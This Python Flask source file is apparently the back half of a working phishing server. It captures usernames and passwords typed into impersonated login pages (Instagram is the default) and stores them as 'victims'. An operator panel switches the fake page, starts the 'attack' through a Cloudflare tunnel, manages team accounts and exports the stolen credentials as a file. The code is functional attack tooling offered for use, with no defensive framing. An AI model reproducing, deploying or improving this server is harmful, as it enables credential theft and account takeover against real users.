# =============================================================================
@app.route("/")
def index():
    return render_template_string(state.get_page_html())

@app.route("/", methods=["POST"])
def capture():
    username = request.form.get("username", "").strip()[:Config.MAX_USERNAME_LENGTH]
    password = request.form.get("password", "").strip()[:Config.MAX_PASSWORD_LENGTH]
    ip = request.remote_addr
    if username and password:
        vid = db.insert_victim(page=state.get_page_name(), ip=ip, username=username, password=password)
        db.add_audit('victim', f'Captured {username} from {ip}', 'phishing', ip)
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        try:
            with open(Config.LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{ts}] {state.get_page_name()} | {ip} | {username}:{password}\n")
        except IOError as e:
            logger.error("Log write error: %s", e)
    return redirect(state.get_page_redirect())

@app.route("/panel/login", methods=["GET","POST"])
def panel_login():
    ip = request.remote_addr
    blocked = db.is_blocked(ip)
    error = None
    if request.method == "POST":
        if blocked:
            error = "Too many login attempts. Please try again in 24 hours."
        else:
            username = request.form.get("username", "")
            password = request.form.get("password", "")
            role, user_data = verify_admin(username, password)
            if role:
                session["logged_in"] = True
                session["username"] = username
                session["role"] = role
                session["last_activity"] = time.time()
                if role == 'super_admin':
                    for p in ['can_view_passwords','can_export','can_delete','can_manage_pages','can_manage_settings','can_chat','can_manage_users','session_timeout']:
                        session[p] = True
                else:
                    for p in ['can_view_passwords','can_export','can_delete','can_manage_pages','can_manage_settings','can_chat','can_manage_users','session_timeout']:
                        session[p] = bool(user_data[p])
                db.add_audit(username, 'Logged in', 'auth', ip)
                return redirect("/panel")
            else:
                db.record_failed_attempt(ip)
                remaining = Config.MAX_LOGIN_ATTEMPTS - db.count_recent_attempts(ip)
                if remaining <= 0:
                    error = "Account locked. Try again later."
                else:
                    error = f"Invalid credentials. {remaining} attempt(s) remaining."
    return render_template_string("""
        <html><head><title>Login</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
        <style>body{background:#09090B;color:white;display:flex;align-items:center;justify-content:center;height:100vh;font-family:Inter;}
        .box{background:#14181F;border:1px solid rgba(255,255,255,0.06);border-radius:18px;padding:40px;width:360px;}
        h1{color:#E5E7EB;margin-bottom:24px;}
        input{width:100%;padding:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:white;margin-bottom:12px;outline:none;}
        button{width:100%;padding:12px;background:linear-gradient(135deg,#7C3AED,#A855F7);border:none;border-radius:12px;color:white;font-weight:600;cursor:pointer;}
        .error{color:#EF4444;margin-bottom:12px;font-size:0.9rem;}
        </style></head><body>
        <div class="box"><h1>🔐 Admin Login</h1>
        {% if error %}<p class="error">{{ error }}</p>{% endif %}
        <form method="POST"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form></div>
        </body></html>
    """, error=error)

@app.route("/panel/logout")
def panel_logout():
    session.clear()
    return redirect("/panel/login")

@app.route("/panel")
@login_required
def panel():
    return render_template_string(CONTROL_PANEL, session=session)

# API endpoints (same as before)
@app.route("/panel/api/dashboard-stats")
@login_required
def dashboard_stats():
    return jsonify({"total": db.total_count(), "today": db.count_today(), "active_page": state.get_page_name()})

@app.route("/panel/api/recent-victims")
@login_required
def api_recent_victims():
    search = request.args.get("search", "")
    page = int(request.args.get("page", 1))
    limit = int(request.args.get("limit", 10))
    sort = request.args.get("sort", "id")
    order = request.args.get("order", "desc")
    offset = (page - 1) * limit
    victims, total = db.get_recent(limit=limit, offset=offset, search=search, sort_by=sort, order=order)
    if not session.get('can_view_passwords', False):
        for v in victims:
            v['pass'] = '••••••••'
    return jsonify({"victims": victims, "total": total, "page": page, "pages": (total + limit - 1) // limit})

@app.route("/panel/api/delete-victims", methods=["POST"])
@login_required
@permission_required('can_delete')
def api_delete_victims():
    ids = request.get_json().get("ids", [])
    if ids:
        db.delete_victims(ids)
        db.add_audit(session['username'], f'Deleted {len(ids)} victims', 'victims', request.remote_addr)
    return jsonify({"status": "ok"})

@app.route("/panel/api/delete-all-victims", methods=["POST"])
@login_required
@permission_required('can_delete')
def api_delete_all():
    db.delete_all()
    return jsonify({"status": "ok"})

@app.route("/panel/api/daily-stats")
@login_required
def api_daily_stats():
    from datetime import timedelta
    days, counts = [], []
    for i in range(6, -1, -1):
        day = datetime.now(timezone.utc).date() - timedelta(days=i)
        days.append(day.strftime("%a"))
        day_str = day.strftime("%Y-%m-%d")
        with Database._lock, db._connect() as conn:
            row = conn.execute("SELECT COUNT(*) FROM victims WHERE timestamp LIKE ?", (f"{day_str}%",)).fetchone()
            counts.append(row[0] if row else 0)
    return jsonify({"labels": days, "data": counts})

@app.route("/panel/api/logs")
@login_required
def api_logs():
    lines = []
    try:
        if Config.LOG_FILE.exists():
            with open(Config.LOG_FILE, "r", encoding="utf-8") as f:
                lines = [line.strip() for line in f.readlines()[-100:]]
    except:
        pass
    return jsonify({"logs": lines})

@app.route("/panel/api/pages-list")
@login_required
def pages_list():
    pages = {}
    for k, v in PAGES.items():
        pages[k] = {"name": v["name"], "active": state.current_page == v}
    return jsonify(pages)

@app.route("/panel/api/select-page", methods=["POST"])
@login_required
@permission_required('can_manage_pages')
def api_select_page():
    key = request.get_json().get("page", "instagram")
    if state.set_page(key):
        db.add_audit(session['username'], f'Changed page to {key}', 'pages', request.remote_addr)
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

@app.route("/panel/api/attack-status")
@login_required
def attack_status():
    return jsonify(state.get_state())

@app.route("/panel/api/set-mode", methods=["POST"])
@login_required
@permission_required('can_manage_settings')
def api_set_mode():
    mode = request.get_json().get("mode", "localhost")
    if mode == "localhost":
        url = f"http://{get_local_ip()}:{Config.PHISH_PORT}"
        state.set_mode("localhost", url)
    elif mode == "cloudflare":
        state.set_mode("cloudflare", None)
        threading.Thread(target=start_cloudflare_tunnel, daemon=True).start()
    return jsonify({"status": "ok"})

@app.route("/panel/api/start-attack", methods=["POST"])
@login_required
@permission_required('can_manage_settings')
def api_start_attack():
    mode = state.get_state()["mode"]
    if not mode:
        url = f"http://{get_local_ip()}:{Config.PHISH_PORT}"
        state.set_mode("localhost", url)
    elif mode == "cloudflare" and not state.get_state()["url"]:
        threading.Thread(target=start_cloudflare_tunnel, daemon=True).start()
    return jsonify({"status": "ok"})

# User management (admin only)
@app.route("/panel/api/users", methods=["GET"])
@login_required
@permission_required('can_manage_users')
def api_users():
    return jsonify(db.get_all_users())

@app.route("/panel/api/users", methods=["POST"])
@login_required
@permission_required('can_manage_users')
def api_add_user():
    data = request.get_json()
    if not data.get("username") or not data.get("password"):
        return jsonify({"error": "Missing fields"}), 400
    db.add_user(
        data["username"],
        data["password"],
        data.get("role", "operator"),
        {
            'can_view_passwords': data.get('can_view_passwords', 0),
            'can_export': data.get('can_export', 0),
            'can_delete': data.get('can_delete', 0),
            'can_manage_pages': data.get('can_manage_pages', 0),
            'can_manage_settings': data.get('can_manage_settings', 0),
            'can_chat': data.get('can_chat', 1),
            'can_manage_users': data.get('can_manage_users', 0),
            'session_timeout': data.get('session_timeout', 30)
        }
    )
    db.add_audit(session['username'], f'Created user {data["username"]}', 'users', request.remote_addr)
    return jsonify({"status": "ok"})

@app.route("/panel/api/users/<int:uid>", methods=["PUT"])
@login_required
@permission_required('can_manage_users')
def api_update_user(uid):
    data = request.get_json()
    db.update_user(uid, data)
    db.add_audit(session['username'], f'Updated user {uid}', 'users', request.remote_addr)
    return jsonify({"status": "ok"})

@app.route("/panel/api/users/<int:uid>", methods=["DELETE"])
@login_required
@permission_required('can_manage_users')
def api_delete_user(uid):
    db.delete_user(uid)
    db.add_audit(session['username'], f'Deleted user {uid}', 'users', request.remote_addr)
    return jsonify({"status": "ok"})

# Chat
@app.route("/panel/api/chat")
@login_required
def chat_get():
    since = int(request.args.get("since", 0))
    return jsonify(db.get_chat_since(since))

@app.route("/panel/api/chat", methods=["POST"])
@login_required
@permission_required('can_chat')
def chat_post():
    msg = request.get_json().get("message", "").strip()
    if msg:
        db.add_chat(session['username'], msg)
    return jsonify({"status": "ok"})

# Request logs for Analytics tab
@app.route("/panel/api/request-logs")
@login_required
def api_request_logs():
    return jsonify(REQUEST_LOG[-100:])

@app.route("/admin")
def admin_redirect():
    return redirect("/panel")

@app.route("/download")
@login_required
def download():
    if Config.LOG_FILE.exists():
        return send_file(Config.LOG_FILE, as_attachment=True, download_name="credentials.txt")
    return "No data", 404

# =============================================================================
# Main
# =============================================================================
def print_banner():
    print("""\033[92m
╔══════════════════════════════════════════════════════╗
║     🦊 PHISHING SERVER – GLASSMORPHISM EDITION     ║
╚══════════════════════════════════════════════════════╝\033[0m""")

def main():
    #print_banner()
    print("info login   { admin : orbit2024 }")
    logger.info("Panel Admin   : http://localhost:%d/panel", Config.PHISH_PORT)
    #logger.info("Login         : %s / %s", Config.ADMIN_USER, Config.ADMIN_PASS_PLAIN)
    #default_url = f"http://{get_local_ip()}:{Config.PHISH_PORT}"
    #state.set_mode("localhost", default_url)
    #logger.info("URL Locale    : %s", default_url)
    #logger.info("Place your background image as 'bg.jpg' in the script folder.")
    #logger.info("Open the Panel to configure.")
    app.run(host="0.0.0.0", port=Config.PHISH_PORT, debug=True, use_reloader=True)

if __name__ == "__main__":
    main()
